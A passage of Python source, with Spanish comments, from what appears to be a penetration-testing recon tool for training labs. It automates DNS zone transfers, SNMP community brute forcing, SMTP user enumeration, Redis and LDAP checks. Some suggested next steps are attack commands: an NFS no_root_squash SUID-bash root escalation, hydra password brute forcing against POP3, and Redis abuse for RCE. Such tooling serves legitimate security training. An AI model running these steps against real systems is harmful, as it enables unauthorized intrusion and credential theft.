            res["findings"].append(("critica", "NFS: no_root_squash probable (root escape: True) → montar como root y escalar con un binario SUID"))
            res["next"].append(
                f"sudo mount -o rw,nolock -t nfs {ip}:{exp} /mnt/x && "
                "cp /bin/bash /mnt/x/rootbash && sudo chown root:root /mnt/x/rootbash && "
                "sudo chmod 4755 /mnt/x/rootbash   # en el objetivo: /mnt/x/rootbash -p  → root")
        # exports escribibles (rw): se puede plantar ficheros (claves SSH, cron, webshell…)
        for perms, share in re.findall(r"\b(rw-|r--)\s+\S+\s+(/\S+)", out):
            if perms == "rw-":
                res["findings"].append(("alta", f"NFS export ESCRIBIBLE (rw): {share}"))
    for lbl, txt in _nse_for(services, host, ("nfs", "rpcinfo")):
        _step(res, f"nmap {lbl}", True, txt, note="exports y servicios RPC que ya enumeró nmap")
    return res


_DNS_SUBDOMAINS = (
    "ns", "ns1", "ns2", "dns", "internal", "int", "intranet", "corp", "ad", "dc", "dc1",
    "hr", "admin", "it", "dev", "devel", "test", "staging", "stage", "support", "helpdesk",
    "mail", "smtp", "vpn", "git", "gitlab", "jenkins", "web", "www", "app", "api", "db",
    "sql", "backup", "private", "secret", "hidden", "local", "office", "remote", "proxy",
)


def _dns_zone_records(out):
    """Registros reales de una salida de dig (axfr/any): descarta comentarios ';' y vacías.
    Puro → testable en --selftest sin red."""
    return [l for l in (out or "").splitlines() if l.strip() and not l.lstrip().startswith(";")]


def _dns_txt_values(records):
    """Contenido de los registros TXT de una lista de líneas de dig (lo que va entre
    comillas) — para destapar flags/secretos guardados como TXT. Puro."""
    vals = []
    for l in records:
        m = re.search(r'\bTXT\b\s+"(.*)"\s*$', l)
        if m:
            vals.append(m.group(1))
    return vals


def _reconcile_domain(vhost, domain):
    """`-D/--domain` es un alias de `--vhost` (ambos alimentan el mismo extra_dom). Si se dan
    los DOS y DISTINTOS → error (son el mismo campo, uno pisaría al otro en silencio); si
    coinciden, o solo se da uno, devuelve el valor. Puro → testable en --selftest."""
    if domain and vhost and domain != vhost:
        raise ValueError(f"--vhost ({vhost}) y --domain ({domain}) son el mismo campo y los has "
                         "puesto distintos; usa solo uno (o el mismo valor en ambos).")
    return vhost or domain


def _dns_axfr_against(res, dom, server, domains):
    """AXFR del apex + brute de subzonas delegadas contra UN servidor DNS concreto —
    compartida por fp_dns (contra el IP escaneado, @ip) y fp_dns_nameservers (contra
    cada NS real del dominio, @ns): mismo chequeo, dos orígenes de 'server' distintos.
    Vuelca steps/findings/next en `res` directamente (no es pura); devuelve True si
    algún AXFR (apex o subzona) tuvo éxito."""
    zones_ok = []
    # 1) AXFR del apex
    rc, out = run_capture(["dig", "axfr", dom, f"@{server}"], timeout=30)
    recs = _dns_zone_records(out)
    ok = rc == 0 and len(recs) > 1 and "Transfer failed" not in out
    _step(res, f"dig axfr {dom} @{server}", ok, out, note="transferencia de zona del apex (AXFR)")
    if ok:
        zones_ok.append((dom, recs))
    # 2) subzonas delegadas: una subzona (hr./internal./dev.) suele permitir el AXFR aunque
    #    el apex lo niegue (REFUSED) — caso real HTB, la flag estaba en un TXT de hr.<dom>.
    #    Se descubren por brute (lista corta + lo ya hallado por crt.sh) probando la SOA: solo
    #    el apex de una zona delegada la devuelve, así que solo se hace AXFR de las que lo son.
    cands = list(dict.fromkeys(
        [f"{s}.{dom}" for s in _DNS_SUBDOMAINS]
        + [d for d in domains if d != dom and d.endswith("." + dom)]))
    subzones = []
    for cand in cands:
        rcs, so = run_capture(["dig", "+short", "+tries=1", "+time=3", "soa", cand, f"@{server}"], timeout=8)
        so = so.strip()
        if rcs != 0 or not so or ";;" in so:
            continue   # NXDOMAIN / sin SOA en ANSWER / error → no es apex de zona delegada
        subzones.append(cand)
        rca, ao = run_capture(["dig", "axfr", cand, f"@{server}"], timeout=20)
        arecs = _dns_zone_records(ao)
        aok = rca == 0 and len(arecs) >= 1 and "Transfer failed" not in ao
        _step(res, f"dig axfr {cand} @{server}", aok, ao, note="AXFR de subzona delegada")
        if aok:
            zones_ok.append((cand, arecs))
    if subzones:
        res["findings"].append(("info", f"Subzonas delegadas de {dom} (vía {server}): {', '.join(subzones)}"))
    # 3) resultado de los AXFR con éxito (apex o subzonas) + TXT (posibles flags/secretos)
    for zname, zrecs in zones_ok:
        res["findings"].append(("alta", f"¡AXFR permitido en {zname} (vía {server})! ({len(zrecs)} registros volcados)"))
        for tv in _dns_txt_values(zrecs):
            res["findings"].append(("alta", f"TXT en {zname} (vía {server}): {tv}   # posible flag/secreto en un registro DNS"))
    return bool(zones_ok)


def fp_dns(ip, ports, services, host, domains, extra_domain, deep):
    res = _fp("dns", "DNS", [p["port"] for p in ports])
    if not have("dig"):
        res["missing"].append("dig (dnsutils)")
        return res
    rc, out = run_capture(["dig", "CH", "TXT", "version.bind", f"@{ip}", "+short"], timeout=15)
    _step(res, f"dig CH TXT version.bind @{ip} +short", rc == 0, out, note="fuga de versión BIND")
    ver = out.strip().strip('"').strip()
    # solo es un hallazgo si dig devolvió DE VERDAD una versión; un error de conexión
    # (líneas ';;' de dig: 'connection refused', 'no servers could be reached') NO es
    # una fuga de versión — antes se colaba como hallazgo [info] (puro ruido).
    if rc == 0 and ver and ";;" not in out and "no servers" not in out.lower():
        res["findings"].append(("info", f"version.bind: {ver}"))
    targets = list(dict.fromkeys(([extra_domain] if extra_domain else []) + list(domains)))
    if not targets:
        res["next"].append(f"dig axfr <dominio> @{ip}   # pasa -D/--domain DOM (te lo da el enunciado) → AXFR del apex + brute de subzonas")
        res["next"].append(f"dig axfr <sub>.<dominio> @{ip}   # las subzonas delegadas (hr./internal./dev.) suelen transferir aunque el apex lo niegue")
        return res
    for dom in targets:
        # registros visibles del apex (por si el AXFR del apex está capado)
        rc2, out2 = run_capture(["dig", "any", dom, f"@{ip}", "+noall", "+answer"], timeout=20)
        _step(res, f"dig any {dom} @{ip}", rc2 == 0, out2, note="registros visibles (A/NS/MX/TXT/SOA)")
        got_axfr = _dns_axfr_against(res, dom, ip, domains)
        if not got_axfr:
            res["next"].append(f"dig axfr <sub>.{dom} @{ip}   # el apex no transfiere; enumera subdominios (subfinder/seclists) y prueba AXFR en cada subzona")
    return res


def _parse_ns_records(out):
    """Hostnames de una salida `dig NS <dominio> +short`: una línea por NS, sin el
    punto final (named. → named), descartando comentarios/vacías. Puro."""
    return sorted({l.strip().rstrip(".").lower() for l in (out or "").splitlines()
                  if l.strip() and not l.lstrip().startswith(";")})


def fp_dns_nameservers(domains, extra_domain):
    """DNS del dominio contra sus NAME SERVERS REALES — no el IP que se esté escaneando.
    fp_dns (arriba) solo se dispara si el 53 está abierto en el objetivo escaneado, pero en
    la mayoría de labs (HTB/CPTS incluidos) el host que resuelve el dominio es un web/DC
    cualquiera y los NS (ns1-3.<dominio>) son máquinas APARTE que ni se escanean si no se
    piden a mano — sin esto, `dig`/AXFR nunca se intentaba contra el servidor que de verdad
    manda la zona. `dig NS` usa el resolutor del sistema (no toca al objetivo); el AXFR que
    sigue sí golpea cada NS encontrado, que es el propio dominio en scope, no un tercero."""
    res = _fp("dns_ns", "DNS (name servers del dominio)", [])
    if not have("dig"):
        res["missing"].append("dig (dnsutils)")
        return res
    apex_doms = sorted({base_domain(d) for d in
                        (([extra_domain] if extra_domain else []) + list(domains))})
    if not apex_doms:
        return res
    for dom in apex_doms:
        rc, out = run_capture(["dig", "NS", dom, "+short"], timeout=15)
        nss = _parse_ns_records(out) if rc == 0 else []
        _step(res, f"dig NS {dom} +short", bool(nss), out, note="name servers autoritativos del dominio")
        if not nss:
            res["next"].append(f"dig NS {dom}   # sin NS resueltos (¿dominio interno/solo-VPN? prueba con @<DC>)")
            continue
        res["findings"].append(("info", f"Name servers de {dom}: {', '.join(nss)}"))
        rc2, out2 = run_capture(["dig", dom, "TXT", "+short"], timeout=15)
        _step(res, f"dig {dom} TXT +short", rc2 == 0 and bool(out2.strip()), out2,
              note="SPF/DMARC/verificaciones de terceros — infraestructura de correo y proveedores externos")
        for tv in [l.strip().strip('"') for l in out2.splitlines() if l.strip() and not l.lstrip().startswith(";")]:
            res["findings"].append(("info", f"TXT {dom}: {tv}"))
        any_axfr = False
        for ns in nss:
            if _dns_axfr_against(res, dom, ns, domains):
                any_axfr = True
        if not any_axfr:
            res["next"].append(f"dig axfr {dom} @{nss[0]}   # repite a mano (REFUSED es lo normal; algún NS secundario mal configurado SÍ transfiere)")
    return res


# ── WHOIS / Certificate Transparency — ligados al DOMINIO, no a un puerto ──
# Se lanzan si hay algún dominio descubierto (SSL/redirect/SMB/--vhost/hostname),
# independientemente de si el 53/tcp-udp está abierto: son consultas a servicios
# PÚBLICOS (whois.*, crt.sh), no al objetivo. Nunca tocan la red del objetivo.

def _parse_whois(out):
    """Extrae registrador/fechas/name servers de una salida de `whois` (puro,
    sin red — testable con una salida fija en --selftest)."""
    reg = re.search(r"(?mi)^\s*Registrar:\s*(.+)$", out)
    created = re.search(r"(?mi)^\s*Creation Date:\s*(.+)$", out)
    expires = re.search(r"(?mi)^\s*(?:Registry Expiry Date|Expiration Date):\s*(.+)$", out)
    ns = sorted({m.strip() for m in re.findall(r"(?mi)^\s*Name Server:\s*(.+)$", out)})
    return {"registrar": reg.group(1).strip() if reg else None,
            "created": created.group(1).strip() if created else None,
            "expires": expires.group(1).strip() if expires else None,
            "ns": ns}


def fp_whois(domains, extra_domain):
    res = _fp("whois", "WHOIS", [])
    if not have("whois"):
        res["missing"].append("whois")
        return res
    targets = sorted({base_domain(d) for d in
                      (([extra_domain] if extra_domain else []) + list(domains))})
    for dom in targets:
        rc, out = run_capture(["whois", dom], timeout=20)
        ok = rc == 0 and bool(out.strip())
        _step(res, f"whois {dom}", ok, out,
              note="registrador, fechas de creación/expiración y name servers — antigüedad/legitimidad del dominio y pista del proveedor de hosting/DNS")
        if ok:
            info_fields = _parse_whois(out)
            parts = []
            if info_fields["registrar"]:
                parts.append(f"registrador: {info_fields['registrar']}")
            if info_fields["created"]:
                parts.append(f"creado: {info_fields['created']}")
            if info_fields["expires"]:
                parts.append(f"expira: {info_fields['expires']}")
            if info_fields["ns"]:
                parts.append("NS: " + ", ".join(info_fields["ns"][:4]))
            if parts:
                res["findings"].append(("info", f"WHOIS {dom} — " + "; ".join(parts)))
    return res


def _crtsh_bin():
    """`crt.sh` (az7rb/crt.sh) no es un paquete apt — vive donde Go instale binarios
    ($GOPATH/bin, a menudo fijado en .zshrc/.bashrc, o /opt/go/bin si GOPATH es
    compartido) si se instaló con `go install`, o en `.local/bin` si lo bajó
    `_install_crtsh` (el binario precompilado de la release, ver _FETCHABLE_RESOURCES:
    MISMO destino que usa `_install_dest_bin`, igual que ya hace `_kerbrute_bin` con
    kerbrute — sin `.local/bin` aquí, una instalación automática recién hecha no se
    detectaría a sí misma). Ver _bin_with_sudo_fallback para el porqué del fallback."""
    return _bin_with_sudo_fallback(("crt.sh",), home_dirs=("go/bin", ".local/bin"),
                                   extra_paths=("/opt/go/bin/crt.sh",))


def fp_ctlogs(domains, extra_domain):
    """Subdominios reales vistos en Certificate Transparency logs (crt.sh), vía
    la CLI `crt.sh` (az7rb/crt.sh). Pasivo y sin wordlist — a diferencia del vhost
    fuzzing por diccionario, solo devuelve subdominios que de verdad tuvieron un
    certificado emitido (incluye antiguos/caducados que el fuzzing no adivinaría)."""
    res = _fp("ctlogs", "Certificate Transparency (crt.sh)", [])
    crtsh = _crtsh_bin()
    if not crtsh:
        res["missing"].append("crt.sh")
        return res
    targets = sorted({base_domain(d) for d in
                      (([extra_domain] if extra_domain else []) + list(domains))})
    found = []
    for dom in targets:
        rc, out = run_capture([crtsh, "-q", "-d", dom], timeout=30)
        subs = sorted({l.strip().lower().lstrip("*.") for l in out.splitlines() if l.strip()})
        ok = rc == 0 and bool(subs)
        _step(res, f"crt.sh -q -d {dom}", ok, "\n".join(subs) if subs else out,
              note="subdominios vistos en certificados SSL/TLS emitidos para el dominio (SAN) — ninguno adivinado, todos confirmados por una CA real")
        if ok:
            shown = ", ".join(subs[:10]) + (f" (+{len(subs) - 10} más)" if len(subs) > 10 else "")
            res["findings"].append(("info", f"CT logs ({dom}): {len(subs)} subdominios únicos — {shown}"))
            found += [s for s in subs if s != dom]
    if found:
        res["next"].append("Confirma estos subdominios como vhost real (ya se prueban solos en la Fase 7) y añádelos a /etc/hosts")
        res["ctlog_subdomains"] = sorted(set(found))
    return res


def _parse_hackertarget_hostsearch(body):
    """Parsea la salida de hackertarget.com/hostsearch (texto plano, 'host,ip' por
    línea) → hostnames únicos en minúscula, ordenados. El free tier sin API key
    devuelve un mensaje de error en vez de CSV cuando se agota la cuota del día o el
    dominio no tiene resultados ('error check your search parameter...', 'API count
    exceeded...') — se detecta y se trata como 'sin resultados', no como un parseo
    roto. Puro → testable sin red."""
    if not body or not body.strip():
        return []
    low = body.strip().lower()
    if low.startswith("error") or "api count exceeded" in low:
        return []
    hosts = []
    for line in body.splitlines():
        line = line.strip()
        if not line or "," not in line:
            continue
        host = line.split(",", 1)[0].strip().lower()
        if host:
            hosts.append(host)
    return sorted(dict.fromkeys(hosts))


def fp_subdomains(domains, extra_domain):
    """Subdominios por DNS pasivo (hackertarget.com/hostsearch, API pública sin auth):
    complementa fp_ctlogs — ese solo ve subdominios que tuvieron un certificado TLS
    emitido alguna vez; este ve cualquiera con un registro DNS indexado, haya tenido
    HTTPS o no. Pasivo y gratis, mismo patrón que fp_wayback (urllib + _http_get, sin
    binario externo). El free tier sin API key tiene cuota diaria por IP: si se agota,
    este módulo simplemente queda sin hallazgos — el resto del run sigue normal, igual
    que con cualquier otra fuente externa que falle o no esté disponible."""
    res = _fp("subdomains", "Subdominios (DNS pasivo)", [])
    targets = sorted({base_domain(d) for d in
                      (([extra_domain] if extra_domain else []) + list(domains))})
    found = []
    for dom in targets:
        url = f"https://api.hackertarget.com/hostsearch/?q={dom}"
        status, _hdrs, body = _http_get(url, timeout=15)
        hosts = _parse_hackertarget_hostsearch(body)
        ok = status == 200 and bool(hosts)
        _step(res, f"GET {url}", ok, body if (status == 200 and body) else f"HTTP {status}",
              note="DNS pasivo (hackertarget.com): subdominios con un registro DNS visto, "
                   "sin depender de que hayan tenido nunca un certificado TLS (a diferencia de CT logs)")
        if ok:
            shown = ", ".join(hosts[:10]) + (f" (+{len(hosts) - 10} más)" if len(hosts) > 10 else "")
            res["findings"].append(("info", f"DNS pasivo ({dom}): {len(hosts)} subdominios únicos — {shown}"))
            found += [h for h in hosts if h != dom]
    if found:
        res["next"].append("Confirma estos subdominios como vhost real (ya se prueban solos en la Fase 7) y añádelos a /etc/hosts")
        res["passive_subdomains"] = sorted(set(found))
    return res


def _parse_wayback(body):
    """Extrae las URLs de la respuesta JSON del CDX API de archive.org (puro,
    sin red — testable con una respuesta fija en --selftest). La 1ª fila es la
    cabecera (["original"]); una búsqueda sin capturas devuelve "" (ni "[]")."""
    if not body or not body.strip():
        return []
    try:
        rows = json.loads(body)
        # El 'rows[1:]' también va DENTRO del try: un 200 con un cuerpo JSON válido pero que
        # no es una lista (p. ej. "null" o un objeto, visto en mantenimiento/rate-limit del
        # CDX API) hace que json.loads NO falle pero sí reviente aquí con TypeError — sin
        # capturarlo subía hasta footprint_services() y se perdía el footprint ENTERO del
        # objetivo (no solo Wayback) por un fallo aislado y ajeno al resto del recon.
        return sorted({r[0] for r in rows[1:] if r})
    except (ValueError, TypeError, KeyError, IndexError):
        # TypeError: rows no es list/dict (None, int...). KeyError: un dict NO admite slice
        # ([1:] con clave slice(1,None,None), no un índice entero) — visto al probarlo con
        # '{"error": "..."}'. IndexError: r[0] sobre un elemento vacío que `if r` no filtró.
        return []


def fp_wayback(domains, extra_domain):
    """Wayback Machine (CDX API de archive.org): URLs históricas ya indexadas del
    dominio. Pasivo y gratis (no toca el objetivo) — a veces hay rutas/backups que
    ya no existen en el sitio actual y que el fuzzing por diccionario no adivinaría."""
    res = _fp("wayback", "Web Archives (Wayback Machine)", [])
    targets = sorted({base_domain(d) for d in
                      (([extra_domain] if extra_domain else []) + list(domains))})
    for dom in targets:
        url = (f"https://web.archive.org/cdx/search/cdx?url={dom}&matchType=domain"
               "&output=json&fl=original&collapse=urlkey&limit=500")
        status, _hdrs, body = _http_get(url, timeout=20, max_bytes=262144)
        ok = status == 200 and bool(body.strip())
        _step(res, f"GET {url}", ok, body if ok else f"HTTP {status}",
              note="URLs históricas indexadas por el Wayback Machine — rutas/ficheros que pudieron existir y ya no están en el sitio actual")
        if ok:
            urls = _parse_wayback(body)
            if urls:
                shown = ", ".join(urls[:10]) + (f" (+{len(urls) - 10} más)" if len(urls) > 10 else "")
                res["findings"].append(("info", f"Wayback ({dom}): {len(urls)} URLs históricas — {shown}"))
                res["next"].append(f"curl -s '{url}' | jq -r '.[1:][] | .[0]'   # lista completa de URLs históricas de {dom}; mira rutas de backup/admin que ya no estén en el sitio actual")
    return res


SMTP_USERLIST = "/usr/share/seclists/Usernames/Names/names.txt"


def _parse_smtp_user_enum(out):
    """Usuarios válidos de la salida de smtp-user-enum: líneas 'IP: user@dom exists'.
    Devuelve la parte local (antes de @) deduplicada. Puro → testable sin red."""
    users = []
    for l in (out or "").splitlines():
        m = re.search(r":\s*(\S+)\s+exists\b", l)
        if m:
            users.append(m.group(1).split("@")[0])
    return list(dict.fromkeys(users))


def _smtp_is_open_relay(txt):
    """True solo si nmap `smtp-open-relay` CONFIRMA un relay abierto. Ojo: el resultado
    NEGATIVO ('Server isn't an open relay, authentication needed') también contiene la
    palabra 'relay' — buscar 'relay' a secas daba un FALSO POSITIVO (y, con SMTP en varios
    puertos 25/587, un hallazgo DUPLICADO). 'is an open relay' NO casa con 'isn't an open
    relay'. Puro → testable en --selftest."""
    return "is an open relay" in (txt or "").lower()


def fp_smtp(ip, ports, services, host, deep, domains=(), extra_domain=None):
    import smtplib
    res = _fp("smtp", "SMTP", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        try:
            srv = smtplib.SMTP(ip, port, timeout=8)
            code, _ = srv.ehlo("palantir")
            feats = ", ".join(sorted(srv.esmtp_features)) if srv.esmtp_features else "(ninguna anunciada)"
            body = [f"EHLO → {code}", f"features: {feats}"]
            vcode, vmsg = srv.verify("root")        # VRFY root
            vtxt = vmsg.decode("latin-1", "replace") if isinstance(vmsg, bytes) else str(vmsg)
            body.append(f"VRFY root → {vcode} {vtxt}")
            try:
                srv.quit()
            except smtplib.SMTPException:
                srv.close()
            _step(res, f"smtplib: EHLO + VRFY root @{ip}:{port}", True, "\n".join(body))
            if vcode in (250, 252):
                res["findings"].append(("media", f"SMTP {port}: VRFY habilitado (enumeración de usuarios posible)"))
                res["next"].append(f"smtp-user-enum -M VRFY -U users.txt -t {ip} -w 15 -v")
        except (smtplib.SMTPException, OSError) as e:
            _step(res, f"smtplib: EHLO @{ip}:{port}", False, f"error: {e}")
    # Enumeración de usuarios por RCPT (smtp-user-enum): solo con --aggressive y un dominio
    # conocido (--vhost/-D o autodescubierto). RCPT distingue usuario válido (250) de inexistente
    # (550); VRFY/EXPN suelen estar capados (p. ej. hMailServer). Ritmo moderado (-m 10) a
    # propósito: con demasiada paralelización el servidor descarta respuestas y da 0 FALSOS.
    dom = extra_domain or (sorted(domains)[0] if domains else None)
    if deep and dom:
        sue = shutil.which("smtp-user-enum")
        if not sue:
            res["missing"].append("smtp-user-enum")
            res["next"].append(f"smtp-user-enum -M RCPT -m 10 -U {SMTP_USERLIST} -D {dom} -t {ip}   # enum de usuarios por RCPT (names.txt de seclists)")
        elif Path(SMTP_USERLIST).is_file():
            eport = 25 if any(p["port"] == 25 for p in ports) else ports[0]["port"]
            cmd = [sue, "-M", "RCPT", "-m", "10", "-U", SMTP_USERLIST, "-D", dom, "-t", ip]
            if eport != 25:
                cmd += ["-p", str(eport)]
            rc, out = run_capture(cmd, timeout=600)   # names.txt (~10k) a -m 10 necesita margen; si peta, se usa la salida parcial
            users = _parse_smtp_user_enum(out)
            _step(res, f"smtp-user-enum -M RCPT -D {dom} ({len(users)} válido/s)", bool(users), out,
                  note="enum de usuarios SMTP por RCPT (names.txt de seclists; un 0 con ritmo alto no es concluyente)")
            if users:
                full = [f"{u}@{dom}" for u in users]   # el login POP3/IMAP es el EMAIL COMPLETO, no el usuario pelado
                more = f" (+{len(users) - 10})" if len(users) > 10 else ""
                res["findings"].append(("media", f"SMTP: usuario(s) válido(s) por RCPT — {', '.join(full[:10])}{more}"))
                if len(full) == 1:
                    res["next"].append(f"hydra -l {full[0]} -P /usr/share/wordlists/rockyou.txt -f -I {ip} pop3   # ⚠️ el login POP3/IMAP es el EMAIL COMPLETO (usuario@dominio), NO el usuario pelado")
                else:
                    res["next"].append(f"Guarda los usuarios CON @{dom} en users.txt → hydra -L users.txt -P /usr/share/wordlists/rockyou.txt -f -I {ip} pop3   # ⚠️ login POP3/IMAP = email completo (usuario@dominio)")
                res["next"].append(f"Con la pass: nc {ip} 110 → USER <usuario>@{dom} / PASS <pass> / LIST / RETR 1   # lee el buzón (la flag va en el cuerpo)")

    relay = False
    for lbl, txt in _nse_for(services, host, ("smtp",)):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
        if _smtp_is_open_relay(txt):   # solo el positivo real; dedup (varios puertos SMTP) con el flag
            relay = True
    if relay:
        res["findings"].append(("alta", "SMTP: open relay confirmado por nmap (smtp-open-relay) — reenvía correo sin autenticar (phishing/spoofing con swaks)"))
    return res


def fp_imap_pop3(ip, ports, services, host, deep):
    res = _fp("imap_pop3", "IMAP / POP3", [p["port"] for p in ports])
    for p in ports:
        port = p["port"]
        banner = grab_banner(ip, port, timeout=5)
        _step(res, f"banner {ip}:{port}", bool(banner), banner or "(sin banner)")
        if port in (110, 143) and banner:
            res["findings"].append(("info", f"{port}: correo en claro (sin TLS) — credenciales viajan sin cifrar"))
    for lbl, txt in _nse_for(services, host, ("imap", "pop3", "ssl-cert")):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
    res["next"] += [
        f"openssl s_client -connect {ip}:993   # IMAPS; luego: a LOGIN user pass / a LIST \"\" *",
        f"curl -k 'imaps://{ip}' --user user:pass -v",
    ]
    return res


# OIDs de alto valor para enumerar cuando una community funciona.
_SNMP_OIDS = [
    ("1.3.6.1.2.1.25.4.2.1.2", "procesos en ejecución"),
    ("1.3.6.1.2.1.25.4.2.1.5", "parámetros de procesos (¡a veces credenciales en la línea de comando!)"),
    ("1.3.6.1.2.1.25.6.3.1.2", "software instalado"),
    ("1.3.6.1.4.1.77.1.2.25", "usuarios Windows (LanMgr)"),
    ("1.3.6.1.2.1.6.13.1.3", "puertos TCP locales en escucha"),
]


# onesixtyone imprime una línea por community válida: "<ip> [community] sysDescr…"
_ONESIXTYONE_RE = re.compile(r"^\S+\s+\[([^\]]*)\]", re.M)


def _snmp_walk_juicy(res, ip, comm):
    """Walk dirigido a los OIDs jugosos con la community dada (procesos y sus argumentos
    —a veces con credenciales—, software, usuarios, puertos) y marca si aparecen secretos."""
    for oid, desc in _SNMP_OIDS:
        rc, o2 = run_capture(["snmpwalk", "-v2c", "-c", comm, "-t", "3", "-r", "1", ip, oid], timeout=40)
        vb = [l for l in o2.splitlines() if "=" in l]
        _step(res, f"snmpwalk -v2c -c {comm} {ip} {oid}", bool(vb), o2, note=desc)
        if "parámetros" in desc and re.search(r"(?i)(pass|pwd|secret|\s-p\s|/user:)", o2):
            res["findings"].append(("alta", f"SNMP: posibles credenciales en los parámetros de procesos (community '{comm}', OID …25.4.2.1.5)"))


def _snmp_find_community(res, ip, deep=True):
    """Devuelve una community SNMP de LECTURA: prueba 'public' y, si no responde, hace
    FUERZA BRUTA con onesixtyone y la wordlist (SNMP_WORDLIST / --snmp-wordlist), parseando
    las communities válidas de su salida. Así se automatiza el caso del lab 'Hard' (la
    community no era 'public' sino 'backup'). El brute-force SOLO corre con `deep`
    (--aggressive, ON por defecto) — es tráfico UDP de fuerza bruta real, --no-aggressive
    debe evitarlo tal y como prometen su ayuda y la de onesixtyone en TOOL_PKGS."""
    rc, out = run_capture(["snmpwalk", "-v2c", "-c", "public", "-t", "3", "-r", "1", ip, "1.3.6.1.2.1.1.1.0"], timeout=20)
    ok = _snmp_ok(out)
    _step(res, f"snmpwalk -v2c -c public {ip} 1.3.6.1.2.1.1.1.0", ok, out, note="¿responde la community 'public'?")
    if ok:
        return "public"
    if not deep:
        res["next"].append(f"onesixtyone -c {SNMP_WORDLIST} {ip}   # 'public' no respondió — repite con --aggressive para que lo pruebe solo, o a mano")
        return None
    if not have("onesixtyone"):
        res["missing"].append("onesixtyone")
        return None
    if not Path(SNMP_WORDLIST).is_file():
        res["next"].append(f"onesixtyone -c <wordlist> {ip}   # instala seclists o pasa --snmp-wordlist FICHERO")
        return None
    rc, out = run_capture(["onesixtyone", "-c", SNMP_WORDLIST, ip], timeout=90)
    _step(res, f"onesixtyone -c {SNMP_WORDLIST} {ip}", rc == 0, out,
          note="'public' no respondió → fuerza bruta de community con la wordlist (manda toda por UDP a la vez)")
    comms = [c for c in dict.fromkeys(_ONESIXTYONE_RE.findall(out)) if c]
    if len(comms) > 1:
        res["findings"].append(("alta", f"SNMP: varias communities válidas por fuerza bruta: {', '.join(comms)}"))
    return comms[0] if comms else None


def fp_snmp(ip, ports, services, host, deep):
    res = _fp("snmp", "SNMP", [p["port"] for p in ports])
    if not have("snmpwalk"):
        res["missing"].append("snmpwalk (snmp)")
        res["next"].append(f"onesixtyone -c {SNMP_WORDLIST} {ip} ; snmpbulkwalk -v2c -c COMMUNITY {ip}")
        return res
    comm = _snmp_find_community(res, ip, deep)   # 'public', o la que saque onesixtyone (solo si deep), o None
    if comm:
        res["findings"].append(("alta", f"SNMP: community de lectura válida — '{comm}' (el árbol SNMP es accesible)"))
        _snmp_walk_juicy(res, ip, comm)    # con la community buena → walk a los OIDs jugosos
        res["next"].append(f"snmpbulkwalk -v2c -c {comm} {ip} | tee snmp.txt ; grep -iE 'pass|user|cred|key|extend|@' snmp.txt   # volcar todo y buscar secretos")
    else:
        res["next"].append(f"onesixtyone -c {SNMP_WORDLIST} {ip}   # no se encontró community (prueba otra con --snmp-wordlist)")
    return res


def fp_redis(ip, ports, services, host, deep):
    res = _fp("redis", "Redis", [p["port"] for p in ports])
    if have("redis-cli"):
        rc, out = run_capture(["redis-cli", "-h", ip, "INFO", "server"], timeout=20)
        _step(res, f"redis-cli -h {ip} INFO server", rc == 0, out, note="acceso sin autenticar")
        if out and "redis_version" in out:
            res["findings"].append(("alta", "Redis: accesible SIN autenticación (INFO respondió)"))
            res["next"] += [
                f"redis-cli -h {ip} CONFIG GET dir   # ruta de trabajo (abuso RCE vía webshell/SSH key)",
                f"redis-cli -h {ip} --scan   # volcar claves",
            ]
        elif "NOAUTH" in out:
            res["findings"].append(("info", "Redis: requiere contraseña (NOAUTH)"))
    else:
        res["missing"].append("redis-cli (redis-tools)")
    for lbl, txt in _nse_for(services, host, ("redis",)):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
    return res


def fp_generic(proto, title, ip, ports, services, host, nse_ids, nexts):
    """Para servicios donde el footprinting profundo necesita credenciales o es
    intrusivo: consolida lo que ya saca NSE y deja los siguientes pasos manuales."""
    res = _fp(proto, title, [p["port"] for p in ports])
    for lbl, txt in _nse_for(services, host, nse_ids):
        _step(res, f"nmap {lbl}", True, txt, note="lo que ya sacó nmap con sus scripts NSE para este servicio")
    res["next"] += nexts
    return res


def fp_oracle(ip, ports, services, host, deep):
    res = fp_generic("oracle", "Oracle TNS", ip, ports, services, host, ("oracle",), [
        f"sudo nmap -p1521 -sV {ip} --open --script oracle-sid-brute   # descubrir el SID",
        f"odat all -s {ip}   # (odat) barrido completo una vez tengas SID/creds",
        f"sqlplus scott/tiger@{ip}/XE   # probar credenciales por defecto",
    ])
    if have("tnscmd10g"):
        rc, out = run_capture(["tnscmd10g", "version", "-h", ip], timeout=20)
        _step(res, f"tnscmd10g version -h {ip}", rc == 0, out, note="versión del listener TNS")
    else:
        res["missing"].append("tnscmd10g")
    return res


def fp_ldap(ip, ports, services, host, deep):
    """LDAP: prueba bind con credenciales por defecto (null → guest → Administrator,
    sin contraseña). Un bind que entre suele volcar usuarios, grupos y política del
    dominio sin credenciales reales. AS-REP roasting y kerberoasting necesitan
    credenciales → quedan como siguientes pasos, no se ejecutan."""
    res = _fp("ldap", "LDAP", [p["port"] for p in ports])
    nxc = nxc_bin()
    if nxc:
        auth = nxc_auth(nxc, "ldap", ip, res)          # fallback null → guest → Administrator
        # Enum LDAP de solo lectura SOLO si entró un bind anónimo. Si ninguno entra, --users/
        # --groups/--pass-pol no devuelven nada — no los lanzamos (ruido). La Fase 5d sí
        # enumera CON la credencial aportada (-u/-p/-H): usuarios, grupos, roasting, delegación.
        if auth is not None:
            user = auth[0]
            # --users es la sonda: un bind anónimo LDAP que ENTRA ([+]) pero no devuelve
            # usuarios está autenticado, no autorizado (el DC deniega la lectura anónima).
            # Si --users no trae datos, --groups/--pass-pol/get-desc-users con la MISMA
            # identidad devolverán lo mismo (nada) → no los lanzamos (era ruido/tiempo).
            rc, users_out = run_capture([nxc, "ldap", ip, "-u", user, "-p", "", "--users"], timeout=60)
            _step(res, f"{nxc} ldap {ip} -u '{user}' -p '' --users", rc == 0, users_out,
                  note="vuelca los usuarios del dominio por LDAP (nombres, descripciones, último login)")
            if _nxc_has_data(users_out):
                for mod, note in (("--groups", "vuelca los grupos del dominio (quién es Domain Admin)"),
                                  ("--pass-pol", "política de contraseñas del dominio (longitud, bloqueo)")):
                    rc, out = run_capture([nxc, "ldap", ip, "-u", user, "-p", "", mod], timeout=60)
